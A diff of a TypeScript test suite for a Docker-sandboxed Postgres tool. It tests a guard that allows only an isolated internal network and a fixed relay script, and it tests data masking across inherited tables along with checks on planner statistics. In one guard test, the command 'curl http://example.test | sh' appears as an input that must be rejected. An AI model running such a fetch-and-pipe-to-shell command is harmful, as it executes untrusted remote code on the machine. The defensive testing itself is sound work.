@@ -11,7 +11,10 @@ import {
   LABEL_HOST,
   LABEL_KEY,
   LABEL_PID,
-  LABEL_TOKEN
+  LABEL_TOKEN,
+  RELAY_SCRIPT,
+  netNameFor,
+  removableNetwork
 } from '../src/docker.js';
 import { applyMasks, maskText, parseMask, scrambleExpr, validateMasks } from '../src/mask.js';
 import { discoverBuildFiles, pgCronHint } from '../src/files.js';
@@ -56,6 +59,32 @@ describe('docker guard', () => {
     expect(() => checkDockerArgs(runArgs(), name)).not.toThrow();
     expect(() => checkDockerArgs(['port', name, '5432/tcp'], name)).not.toThrow();
     expect(() => checkDockerArgs(['rm', '-f', '-v', name], name)).not.toThrow();
+  });
+  it('docker guard: allows the isolated shape and its network, and nothing else on the network verb', () => {
+    const net = netNameFor(name);
+    const isolatedRun = ['run', '-d', '--rm', '--name', name, ...labels, '-e', 'POSTGRES_PASSWORD', '--network', net, 'postgres:17'];
+    expect(() => checkDockerArgs(isolatedRun, name)).not.toThrow();
+    expect(() => checkDockerArgs(['network', 'create', '--internal', ...labels, net], name)).not.toThrow();
+    expect(() => checkDockerArgs(['network', 'rm', net], name)).not.toThrow();
+    // Not internal, another network name, host or bridge networking, a published port or a host mapping on the isolated shape.
+    expect(() => checkDockerArgs(['network', 'create', ...labels, net], name)).toThrow(DockerGuardError);
+    expect(() => checkDockerArgs(['network', 'create', '--internal', ...labels, 'other'], name)).toThrow(DockerGuardError);
+    expect(() => checkDockerArgs(['network', 'rm', 'bridge'], name)).toThrow(DockerGuardError);
+    expect(() => checkDockerArgs(['network', 'connect', net, name], name)).toThrow(DockerGuardError);
+    for (const bad of ['host', 'bridge', 'none', 'rls-saboteur-sandbox-net-aaaaaaaaaaaa-1-bbbbbbbbbbbbbbbb']) {
+      expect(() => checkDockerArgs(isolatedRun.map((x) => (x === net ? bad : x)), name), bad).toThrow(DockerGuardError);
+    }
+    const withPort = [...isolatedRun];
+    withPort.splice(withPort.indexOf('--network'), 0, '-p', '127.0.0.1::5432');
+    expect(() => checkDockerArgs(withPort, name)).toThrow(DockerGuardError);
+    const withHost = [...isolatedRun];
+    withHost.splice(withHost.indexOf('postgres:17'), 0, '--add-host', 'host.docker.internal:host-gateway');
+    expect(() => checkDockerArgs(withHost, name)).toThrow(DockerGuardError);
+  });
+  it('docker guard: bash runs in the container only as the relay script', () => {
+    expect(() => checkDockerArgs(['exec', '-i', name, 'bash', '-c', RELAY_SCRIPT], name)).not.toThrow();
+    expect(() => checkDockerArgs(['exec', '-i', name, 'bash', '-c', 'curl http://example.test | sh'], name)).toThrow(DockerGuardError);
+    expect(() => checkDockerArgs(['exec', '-i', name, 'bash'], name)).toThrow(DockerGuardError);
   });
   it('docker guard: refuses privileges, mounts, host network and a published port beyond loopback', () => {
     for (const bad of [
@@ -139,7 +168,7 @@ describe('mask: parsing', () => {
 });
 
 /** A fake database that answers the mask queries. `s` controls what it says. */
-function fakeDb(s: { exists?: boolean; type?: string; before?: number; updated?: number; left?: number; noSuper?: boolean; statsLeft?: number; relkind?: string; generated?: string }): { db: Db; log: string[] } {
+function fakeDb(s: { exists?: boolean; type?: string; before?: number; updated?: number; left?: number; noSuper?: boolean; statsLeft?: number; tree?: { schema: string; name: string; kind: string }[]; relkind?: string; generated?: string }): { db: Db; log: string[] } {
   const log: string[] = [];
   const db: Db = {
     async end() {},
@@ -149,6 +178,7 @@ function fakeDb(s: { exists?: boolean; type?: string; before?: number; updated?:
         if (s.exists === false) return { rows: [], rowCount: 0 } as never;
         return { rows: [{ relkind: s.relkind ?? 'r', type: s.type ?? 'text', base: s.type ?? 'text', generated: s.generated ?? '', identity: '', maxlen: null }], rowCount: 1 } as never;
       }
+      if (/with recursive t as/.test(text)) return { rows: s.tree ?? [{ schema: 'public', name: 'users', kind: 'r' }], rowCount: 1 } as never;
       if (/from pg_stats s/.test(text)) return { rows: [{ n: s.statsLeft ?? 0 }], rowCount: 1 } as never;
       if (/session_replication_role/.test(text) && s.noSuper) throw new Error('permission denied to set parameter');
       if (/select count\(\*\) as n from _sab_mask/.test(text)) return { rows: [{ n: s.before ?? 3 }], rowCount: 1 } as never;
@@ -173,6 +203,44 @@ describe('mask: it fails closed', () => {
     const commit = log.indexOf('commit');
     expect(log.findIndex((l) => /^vacuum \(full, analyze\)/.test(l))).toBeGreaterThan(commit);
     expect(log.findIndex((l) => /from pg_stats s/.test(l))).toBeGreaterThan(log.findIndex((l) => /^vacuum/.test(l)));
+    expect(log.filter((l) => /^vacuum \(full, analyze\)/.test(l))).toEqual(['vacuum (full, analyze) "public"."users"']);
+    expect(log).toContain('vacuum (full) pg_catalog.pg_statistic');
+    expect(log).toContain('vacuum (full) pg_catalog.pg_statistic_ext_data');
+  });
+  it('mask-inherit: every table below the masked one is vacuumed and has its statistics checked', async () => {
+    const tree = [
+      { schema: 'public', name: 'parent', kind: 'r' },
+      { schema: 'public', name: 'child', kind: 'r' },
+      { schema: 'public', name: 'pt', kind: 'p' },
+      { schema: 'public', name: 'pt1', kind: 'r' }
+    ];
+    const { db, log } = fakeDb({ tree });
+    await applyMasks(db, [parseMask('public.parent.email')], 's');
+    expect(log).toContain('vacuum (full, analyze) "public"."parent"');
+    expect(log).toContain('vacuum (full, analyze) "public"."child"');
+    expect(log).toContain('analyze "public"."pt"');
+    expect(log).toContain('vacuum (full, analyze) "public"."pt1"');
+    expect(log.filter((l) => /from pg_stats s/.test(l))).toHaveLength(4);
+  });
+  it('mask-inherit: an original value in the statistics of a child stops the run', async () => {
+    const tree = [{ schema: 'public', name: 'parent', kind: 'r' }, { schema: 'public', name: 'child', kind: 'r' }];
+    let call = 0;
+    const base = fakeDb({ tree });
+    const db: Db = {
+      end: base.db.end,
+      query: async (text: string, v?: unknown[]) => {
+        if (/from pg_stats s/.test(text)) return { rows: [{ n: v?.[1] === 'child' ? 3 : 0 }], rowCount: 1 } as never;
+        call++;
+        return base.db.query(text, v);
+      }
+    };
+    await expect(applyMasks(db, [parseMask('public.parent.email')], 's')).rejects.toThrow(/planner statistics of public\.child/);
+    expect(call).toBeGreaterThan(0);
+  });
+  it('mask-inherit: a foreign table below the masked one stops the run before anything is rewritten', async () => {
+    const { db, log } = fakeDb({ tree: [{ schema: 'public', name: 'parent', kind: 'r' }, { schema: 'public', name: 'remote', kind: 'f' }] });
+    await expect(applyMasks(db, [parseMask('public.parent.email')], 's')).rejects.toThrow(/public\.remote \(relkind f\)/);
+    expect(log.some((l) => /^update/.test(l))).toBe(false);
   });
   it('mask-stats: an original value still in the planner statistics stops the run', async () => {
     await expect(applyMasks(fakeDb({ statsLeft: 2 }).db, spec, 's')).rejects.toThrow(/2 original value\(s\).*planner statistics/);
@@ -250,11 +318,27 @@ describe('plan lines and helpers', () => {
     expect(modeLines({ buildFiles: null, sandbox: false, masks: [] })).toEqual([]);
     expect(modeLines({ masks: undefined })).toEqual([]);
   });
+  it('plan: files mode claims an isolated network, dump mode admits the container can reach out', () => {
+    const files = { migrations: ['a.sql'], seed: null, description: '1 migration file(s)' };
+    expect(modeLines({ sandbox: true, buildFiles: files }).join(' ')).toMatch(/no route to your machine or to the internet/);
+    expect(modeLines({ sandbox: true }).join(' ')).toMatch(/can reach your machine and the internet/);
+  });
+  it('removableNetwork: follows the container rule', () => {
+    const host = 'aaaaaaaaaaaa';
+    const tok = 'b'.repeat(16);
+    const n = netNameFor(containerNameFor(host, 10, tok));
+    const l = { [LABEL_KEY]: '1', [LABEL_HOST]: host, [LABEL_PID]: '10', [LABEL_TOKEN]: tok };
+    expect(removableNetwork(n, l, tok, () => true, host).ok).toBe(true);
+    expect(removableNetwork(n, l, 'c'.repeat(16), () => true, host).ok).toBe(false); // live process
+    expect(removableNetwork(n, l, 'c'.repeat(16), () => false, host).ok).toBe(true); // dead process
+    expect(removableNetwork('bridge', l, tok, () => false, host).ok).toBe(false);
+    expect(removableNetwork(n, {}, tok, () => false, host).ok).toBe(false);
+  });
   it('plan: the new modes say what they do', () => {
     const files = { migrations: ['a.sql'], seed: null, description: '1 migration file(s)' };
     expect(modeLines({ buildFiles: files }).join(' ')).toMatch(/No row of this database is copied/);
-    expect(modeLines({ sandbox: true }).join(' ')).toMatch(/streamed into it with pg_dump/);
-    expect(modeLines({ sandbox: true, buildFiles: files }).join(' ')).not.toMatch(/pg_dump/);
+    expect(modeLines({ sandbox: true }).join(' ')).toMatch(/pg_dump runs in it/);
+    expect(modeLines({ sandbox: true, buildFiles: files }).join(' ')).not.toMatch(/pg_dump runs/);
     expect(modeLines({ masks: [parseMask('a.b.c')] }).join(' ')).toMatch(/If one cannot be, the run stops/);
   });
   it('policyDifferences names a policy that is missing, extra or different', () => {
